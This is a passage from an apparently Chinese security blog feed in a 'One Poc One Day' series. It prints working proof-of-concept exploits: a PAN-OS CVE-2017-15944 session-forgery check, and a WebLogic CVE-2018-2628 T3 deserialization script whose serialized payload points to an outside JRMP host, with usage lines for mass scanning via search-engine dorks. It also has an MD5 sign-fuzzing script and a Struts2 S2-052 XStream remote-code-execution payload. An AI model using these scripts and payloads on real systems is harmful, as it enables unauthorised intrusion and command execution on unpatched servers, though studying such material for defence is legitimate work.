class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: am4zing</span></span><br><span class="line"><span class="comment"># Date: 2018-08-10 14:31:58</span></span><br><span class="line"><span class="comment"># Project: https://github.com/yizhimanpadewoniu</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Palo Alto Network Firework CVE-2017-15944</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">影响版本：</span></span><br><span class="line"><span class="string">PAN-OS 6.1.18 and earlier </span></span><br><span class="line"><span class="string">PAN-OS 7.0.18 and earlier</span></span><br><span class="line"><span class="string">PAN-OS 7.1.13 and earlier</span></span><br><span class="line"><span class="string">PAN-OS 8.0.5 and earlier</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> termcolor <span class="keyword">import</span> cprint</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        create_session_url = <span class="string">'&#123;&#125;/esp/cms_changeDeviceContext.esp?device=aaaaa:a%27";user|s."1337";'</span>.format(url)</span><br><span class="line">        verify_url = <span class="string">'&#123;&#125;/php/utils/debug.php'</span>.format(url)</span><br><span class="line">        session = requests.Session()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'https'</span> <span class="keyword">in</span> url:</span><br><span class="line">            session.get(verify_url, verify=<span class="keyword">False</span>)</span><br><span class="line">            session.get(create_session_url, verify=<span class="keyword">False</span>)</span><br><span class="line">            verify = session.get(verify_url, verify=<span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session.get(verify_url)</span><br><span class="line">            session.get(create_session_url)</span><br><span class="line">            verify = session.get(verify_url)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Debug Console'</span> <span class="keyword">in</span> verify.text:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'[CVE-2017-15944]'</span> + url</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> cprint(<span class="string">'[Somethin wrong:] '</span> + url, <span class="string">'red'</span>)</span><br></pre></td></tr></table></figure><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="# 0x03 参考"></a># 0x03 参考</h2><p><a href="https://xz.aliyun.com/t/1795" target="_blank" rel="noopener">先知社区-https://xz.aliyun.com/t/1795</a></p>]]></content>
      
      
        <tags>
            
            <tag> poc </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>【One Poc One Day】—— weblogic CVE-2018-2628</title>
      <link href="/2018/08/07/%E3%80%90One%20Poc%20One%20Day%E3%80%91%E2%80%94%E2%80%94CVE-2018-2628/"/>
      <url>/2018/08/07/%E3%80%90One%20Poc%20One%20Day%E3%80%91%E2%80%94%E2%80%94CVE-2018-2628/</url>
      <content type="html"><![CDATA[<h2 id="0x01"><a href="#0x01" class="headerlink" title="# 0x01"></a># 0x01</h2><blockquote><p><strong>One Poc One Day —— Weblogic CVE-2018-2826 </strong></p></blockquote><h2 id="0x02"><a href="#0x02" class="headerlink" title="# 0x02"></a># 0x02</h2><h4 id="原理"><a href="#原理" class="headerlink" title="## 原理"></a>## 原理</h4><blockquote><p>漏洞通过t3协议触发，可导致未授权的用户在远程服务器执行任意命令 </p><p>关于t3协议,我找到了一篇简单的说明的blog参考</p><p><a href="https://blog.csdn.net/cymm_liu/article/details/36011725" target="_blank" rel="noopener">https://blog.csdn.net/cymm_liu/article/details/36011725</a></p></blockquote><h4 id="Poc"><a href="#Poc" class="headerlink" title="## Poc"></a>## Poc</h4><blockquote><p>参考Exploit-DB脚本来的，参考链接如下：</p><p><a href="https://www.exploit-db.com/exploits/44553/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/44553/</a></p><p>只是做了简单的适配，可以适配到POC-T，进行检测</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># project = https://github.com/yizhimanpadewwoniu</span></span><br><span class="line"><span class="comment"># author = am4zing</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Weblogic CVE-2018-2628</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">影响版本：</span></span><br><span class="line"><span class="string">Oracle WebLogic Server10.3.6.0</span></span><br><span class="line"><span class="string">Oracle WebLogic Server12.2.1.2</span></span><br><span class="line"><span class="string">Oracle WebLogic Server12.2.1.3</span></span><br><span class="line"><span class="string">Oracle WebLogic Server12.1.3.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Usage：</span></span><br><span class="line"><span class="string">python POC-T.py -s weblogic-cve-2018-2628 -aG "inurl:login.action" --gproxy "http 127.0.0.1 1080"</span></span><br><span class="line"><span class="string">python POC-T.py -s weblogic-cve-2018-2628 -aZ "login.action"</span></span><br><span class="line"><span class="string">python POC-T.py -s weblogic-cve-2018-2628 -iF FILE.txt</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> termcolor <span class="keyword">import</span> cprint</span><br><span class="line"><span class="keyword">from</span> urlparse <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PAYLOAD = [<span class="string">'aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707737000a556e6963617374526566000e3130342e3235312e3232382e353000001b590000000001eea90b00000000000000000000000000000078'</span>]</span><br><span class="line">VER_SIG = [<span class="string">'\\$Proxy[0-9]+'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buildT3RequestObject</span><span class="params">(sock, port, server_addr)</span>:</span></span><br><span class="line">    data1 = <span class="string">'000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'</span></span><br><span class="line">    data2 = <span class="string">'007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000&#123;0&#125;ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'</span>.format(<span class="string">'&#123;:04x&#125;'</span>.format(dport))</span><br><span class="line">    data3 = <span class="string">'1a7727000d3234322e323134'</span></span><br><span class="line">    data4 = <span class="string">'2e312e32353461863d1d0000000078'</span></span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> [data1, data2, data3, data4]:</span><br><span class="line">        sock.send(d.decode(<span class="string">'hex'</span>))</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    date = len(sock.recv(<span class="number">2048</span>))</span><br><span class="line">    <span class="keyword">return</span> date</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendEvilObjData</span><span class="params">(sock, data)</span>:</span></span><br><span class="line">    payload = <span class="string">'056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'</span></span><br><span class="line">    payload += data</span><br><span class="line">    payload += <span class="string">'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'</span></span><br><span class="line">    payload = <span class="string">'%s%s'</span> % (<span class="string">'&#123;:08x&#125;'</span>.format(len(payload) / <span class="number">2</span> + <span class="number">4</span>), payload)</span><br><span class="line">    sock.send(payload.decode(<span class="string">'hex'</span>))</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    sock.send(payload.decode(<span class="string">'hex'</span>))</span><br><span class="line">    res = <span class="string">''</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            res += sock.recv(<span class="number">4096</span>)</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> dport</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'http://'</span> <span class="keyword">in</span> url:</span><br><span class="line">        domain = (urlparse(url)).netloc</span><br><span class="line">        dip = domain.split(<span class="string">':'</span>)[<span class="number">0</span>]</span><br><span class="line">        dport = domain.split(<span class="string">':'</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">':'</span> <span class="keyword">in</span> url:</span><br><span class="line">        dip = url.split(<span class="string">':'</span>)[<span class="number">0</span>]</span><br><span class="line">        dport = int(url.split(<span class="string">':'</span>)[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dip = url</span><br><span class="line">        dport = <span class="number">7001</span></span><br><span class="line">    dport=int(dport)</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment">#打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整</span></span><br><span class="line">    sock.settimeout(<span class="number">5</span>)</span><br><span class="line">    server_addr = (dip, dport)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sock.connect(server_addr)</span><br><span class="line">        send_data = <span class="string">'74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">        sock.send(send_data)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> cprint(<span class="string">'[Connect Failed]: %s'</span> % url, <span class="string">'red'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            dateout = buildT3RequestObject(sock, dport, server_addr)</span><br><span class="line">            <span class="keyword">if</span> dateout == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                rs = sendEvilObjData(sock, PAYLOAD[<span class="number">0</span>])</span><br><span class="line">                p = re.findall(VER_SIG[<span class="number">0</span>], rs, re.S)</span><br><span class="line">                <span class="keyword">if</span> len(p) &gt; <span class="number">0</span>:</span><br><span class="line">                    <span class="comment"># print '[CVE-2018-2628]:' + url</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="string">'[CVE-2018-2628]:'</span> + url</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="comment"># print "no result"</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> cprint(<span class="string">'Try Again. %s'</span> % url, <span class="string">'red'</span>)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">                sock.close()</span><br></pre></td></tr></table></figure><h4 id="检测"><a href="#检测" class="headerlink" title="## 检测"></a>## 检测</h4><p><img src="https://i.loli.net/2018/08/07/5b69ac2ea34cf.png" alt="访问页面"></p><p><img src="https://i.loli.net/2018/08/07/5b69ac2e9c66e.png" alt="Poc验证"></p>]]></content>
      
      
        <tags>
            
            <tag> poc </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python的排列组合</title>
      <link href="/2018/08/01/python%E7%9A%84%E6%8E%92%E5%88%97%E7%BB%84%E5%90%88/"/>
      <url>/2018/08/01/python%E7%9A%84%E6%8E%92%E5%88%97%E7%BB%84%E5%90%88/</url>
      <content type="html"><![CDATA[<h2 id="0x01-需求"><a href="#0x01-需求" class="headerlink" title="# 0x01 需求"></a># 0x01 需求</h2><blockquote><p>Python requirements：</p><ul><li>itertools</li><li>hashlib</li></ul></blockquote><h2 id="0x02"><a href="#0x02" class="headerlink" title="# 0x02"></a># 0x02</h2><p>测试的时候可能会发现提交的数据中有类似“sign”这样的值，这个值有很多时候是作为校验存在的，同时因为是加密后的密文所以难以被猜解，那么，有一种思路是这样的，这个值是请求包中的某个值或者某几个值进行加密，作为sign，这样既方便后端的校验，也同样保证了安全性。</p><p>所以需要对这个值进行Fuzz，说不定思路就对了呢~</p><blockquote><p>Usage:  python test.py test.py 3</p><p><strong>数字指定随机组合的位数，示例中的3标识，随机选取3个进行随机组合</strong></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># import md5</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> termcolor <span class="keyword">import</span> cprint</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">permutations_md5</span><span class="params">(origin)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        md5_value =  hashlib.md5(origin).hexdigest()</span><br><span class="line">        <span class="keyword">print</span> md5_value</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        cprint(<span class="string">'md5 error:'</span>, <span class="string">'red'</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"check your origin value."</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">permutations</span><span class="params">(data, value)</span>:</span></span><br><span class="line">    data_array = []</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> data:</span><br><span class="line">        data_array.append(line.strip(<span class="string">'\n'</span>))</span><br><span class="line">    data_list = list(product(data_array, repeat=int(value)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(data_list)):</span><br><span class="line">        md5_origin = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> range(int(value)):</span><br><span class="line">            md5_origin += data_list[i][ii]</span><br><span class="line">        permutations_md5(md5_origin)</span><br><span class="line">    cprint(<span class="string">"\n The process is Complete！"</span>, <span class="string">'green'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    path = sys.argv[<span class="number">1</span>]</span><br><span class="line">    random_int = sys.argv[<span class="number">2</span>]</span><br><span class="line">    keys = open(path, <span class="string">'r'</span>)</span><br><span class="line">    keys_data = keys.readlines()</span><br><span class="line">    <span class="keyword">if</span> int(random_int) &gt; len(keys_data):</span><br><span class="line">        cprint(<span class="string">"The value is to big."</span>, <span class="string">'red'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        permutations(keys_data, random_int)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>【One Poc One Day】—— Struts2 052</title>
      <link href="/2018/08/01/%E3%80%90One%20Poc%20One%20Day%E3%80%91%E2%80%94%E2%80%94Struts2%20052/"/>
      <url>/2018/08/01/%E3%80%90One%20Poc%20One%20Day%E3%80%91%E2%80%94%E2%80%94Struts2%20052/</url>
      <content type="html"><![CDATA[<h2 id="0x01"><a href="#0x01" class="headerlink" title="# 0x01"></a># 0x01</h2><blockquote><p><strong>One Poc One Day —— Struts2 052</strong></p></blockquote><h2 id="0x02"><a href="#0x02" class="headerlink" title="# 0x02"></a># 0x02</h2><h4 id="原理"><a href="#原理" class="headerlink" title="## 原理"></a>## 原理</h4><blockquote><p>Struts2 REST 插件使用带有 XStream 程序的 XStream Handler 进行未经任何代码过滤的反序列化操作，这可能在反序列化XML payloads时导致远程代码执行。任意攻击者都可以构造恶意的XML内容提升权限。 </p></blockquote><h4 id="Payload"><a href="#Payload" class="headerlink" title="## Payload"></a>## Payload</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span><span class="tag">&lt;<span class="name">entry</span>&gt;</span><span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span><span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span><span class="tag">&lt;<span class="name">valueclass="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"</span>&gt;</span><span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span><span class="tag">&lt;<span class="name">dataSourceclass="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"</span>&gt;</span><span class="tag">&lt;<span class="name">isclass="javax.crypto.CipherInputStream"</span>&gt;</span><span class="tag">&lt;<span class="name">cipherclass="javax.crypto.NullCipher"</span>&gt;</span><span class="tag">&lt;<span class="name">initialized</span>&gt;</span>false<span class="tag">&lt;/<span class="name">initialized</span>&gt;</span><span class="tag">&lt;<span class="name">opmode</span>&gt;</span>0<span class="tag">&lt;/<span class="name">opmode</span>&gt;</span><span class="tag">&lt;<span class="name">serviceIteratorclass="javax.imageio.spi.FilterIterator"</span>&gt;</span><span class="tag">&lt;<span class="name">iterclass="javax.imageio.spi.FilterIterator"</span>&gt;</span><span class="tag">&lt;<span class="name">iterclass="java.util.Collections$EmptyIterator"</span>/&gt;</span><span class="tag">&lt;<span class="name">nextclass="java.lang.ProcessBuilder"</span>&gt;</span><span class="tag">&lt;<span class="name">command</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>touch<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>/tmp/success<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">command</span>&gt;</span><span class="tag">&lt;<span class="name">redirectErrorStream</span>&gt;</span>false<span class="tag">&lt;/<span class="name">redirectErrorStream</span>&gt;</span><span class="tag">&lt;/<span class="name">next</span>&gt;</span><span class="tag">&lt;/<span class="name">iter</span>&gt;</span><span class="tag">&lt;<span class="name">filterclass="javax.imageio.ImageIO$ContainsFilter"</span>&gt;</span><span class="tag">&lt;<span class="name">method</span>&gt;</span><span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="tag">&lt;/<span class="name">class</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span><span class="tag">&lt;/<span class="name">method</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">filter</span>&gt;</span><span class="tag">&lt;<span class="name">nextclass="string"</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">next</span>&gt;</span><span class="tag">&lt;/<span class="name">serviceIterator</span>&gt;</span><span class="tag">&lt;<span class="name">lock</span>/&gt;</span><span class="tag">&lt;/<span class="name">cipher</span>&gt;</span><span class="tag">&lt;<span class="name">inputclass="java.lang.ProcessBuilder$NullInputStream"</span>/&gt;</span><span class="tag">&lt;<span class="name">ibuffer</span>&gt;</span><span class="tag">&lt;/<span class="name">ibuffer</span>&gt;</span><span class="tag">&lt;<span class="name">done</span>&gt;</span>false<span class="tag">&lt;/<span class="name">done</span>&gt;</span><span class="tag">&lt;<span class="name">ostart</span>&gt;</span>0<span class="tag">&lt;/<span class="name">ostart</span>&gt;</span><span class="tag">&lt;<span class="name">ofinish</span>&gt;</span>0<span class="tag">&lt;/<span class="name">ofinish</span>&gt;</span><span class="tag">&lt;<span class="name">closed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">closed</span>&gt;</span><span class="tag">&lt;/<span class="name">is</span>&gt;</span><span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span><span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span><span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span><span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span><span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span><span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeStringreference="..</span>/<span class="attr">jdk.nashorn.internal.objects.NativeString</span>"/&gt;</span><span class="tag">&lt;/<span class="name">entry</span>&gt;</span><span class="tag">&lt;<span class="name">entry</span>&gt;</span><span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeStringreference="..</span>/<span class="attr">..</span>/<span class="attr">entry</span>/<span class="attr">jdk.nashorn.internal.objects.NativeString</span>"/&gt;</span><span class="tag">&lt;<span 